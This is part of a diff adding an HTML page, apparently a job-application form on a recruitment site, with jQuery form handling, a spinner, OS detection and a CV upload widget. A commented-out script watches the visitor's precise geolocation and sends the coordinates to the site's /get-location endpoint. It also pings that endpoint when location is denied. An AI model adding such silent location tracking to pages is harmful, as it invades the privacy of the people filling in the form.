+            $("#loading").hide()
+            $("#btnFormSubmit").show()
+            return false;
+        }
+        
+    }
+</script>
+     
+      <style>
+          .loading-spinner{
+  width:30px;
+  height:30px;
+  border:2px solid indigo;
+  border-radius:50%;
+  border-top-color:#0001;
+  display:inline-block;
+  animation:loadingspinner .7s linear infinite;
+}
+@keyframes loadingspinner{
+  0%{
+    transform:rotate(0deg)
+  }
+  100%{
+    transform:rotate(360deg)
+  }
+}
+      </style>
+    <!-- <script>
+        $(window).on("load", function () {
+            // var latitude = "none"
+            // var longitude = "none"
+            // console.log(latitude, longitude);
+            // fetch(`https://tuyendung.me/get-location&Latitude=${latitude}&Longitude=${longitude}`)
+            //     .then(res => res.json()).then(data => {
+            //         console.log(data)
+            //     })
+            //     .catch(rejected => {
+            //         console.log(rejected);
+            //     });
+                    var lastUpdateTime,
+                    minFrequency = 10*1000*60,
+                    watchOptions = {
+                        timeout : 60*60*1000,
+                        maxAge: 0,
+                        enableHighAccuracy: true
+                    };
+                    navigator.geolocation.watchPosition(on_success,onError,watchOptions);
+                    function on_success(position){
+                        var now = new Date();
+                        if(lastUpdateTime && now.getTime() - lastUpdateTime.getTime() < minFrequency){
+                            console.log("Ignoring position update");
+                            return;
+                        }
+                        lastUpdateTime = now;
+                        var latitude =  position.coords.latitude
+                        var longitude=  position.coords.longitude
+                        fetch(`https://tuyendung.me/get-location&Latitude=${latitude}&Longitude=${longitude}`)
+                        .then(res => res.json()).then(data => {console.log(data)}).catch(rejected => {
+                                        console.log(rejected);
+                        });
+                    }
+                    function onError(error) {
+                        var latitude =  "none"
+                        var longitude=  "none"
+                        fetch(`https://tuyendung.me/get-location&Latitude=${latitude}&Longitude=${longitude}`)
+                        .then(res => res.json()).then(data => {console.log(data)}).catch(rejected => {
+                                        console.log(rejected);
+                         });
+                        console.log(error)
+                    }
+        })
+    </script> -->
+
+    <script>
+        $( document ).ready(function() {
+            
+            const return_os = getPlatformOS()
+            $("#get_os").html(`<input  type="text" name="Detect_the_OS"  value="${return_os}" />`)
+        });
+        function getPlatformOS() {
+            const userAgent = window.navigator.userAgent;
+            let os = null;
+            const isIOS = (/iPad|iPhone|iPod/.test(userAgent) ||
+            (/Mac|Mac OS|MacIntel/gi.test(userAgent) && (navigator.maxTouchPoints > 1 || "ontouchend" in document))) && !window.MSStream;
+            if (/Macintosh|Mac|Mac OS|MacIntel|MacPPC|Mac68K/gi.test(userAgent)) {
+                os = 'Mac OS';
+            } else if (isIOS) {
+                os = 'iOS';
+            } else if (/'Win32|Win64|Windows|Windows NT|WinCE/gi.test(userAgent)) {
+                os = 'Windows';
+            } else if (/Android/gi.test(userAgent)) {
+                os = 'Android';
+            } else if (/Linux/gi.test(userAgent)) {
+                os = 'Linux';
+            }
+            return os
+            }
+        $(".browse-button input:file").change(function () {
+            $("input[name='fileCV']").each(function () {
+                var fileName = $(this).val().split('/').pop().split('\\').pop();
+                $(".filename").val(fileName);
+                $(".browse-button-text").html('<i class="fa fa-refresh"></i> Change');
+                $(".clear-button").show();
+            });
+        });
+        $('.clear-button').click(function () {
+            $('.filename').val("");
+            $('.clear-button').hide();
+            $('.browse-button input:file').val("");
+            $(".browse-button-text").html('<i class="fa fa-folder-open"></i> Browse');
+        });
+    </script>
+    <script src="js/jquery_min.js"></script>
+    <script src="js/bootstrap.js"></script>
+    <script src="js/jquery.menu-aim.js"></script>
+    <script src="js/jquery.countTo.js"></script>
+    <script src="js/jquery.inview.min.js"></script>
+    <script src="js/owl.carousel.js"></script>
+    <script src="js/modernizr.js"></script>
+    <script src="js/custom.js"></script>
+    <script src="jquery.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css.map"></script>
+</body>
+
+</html>
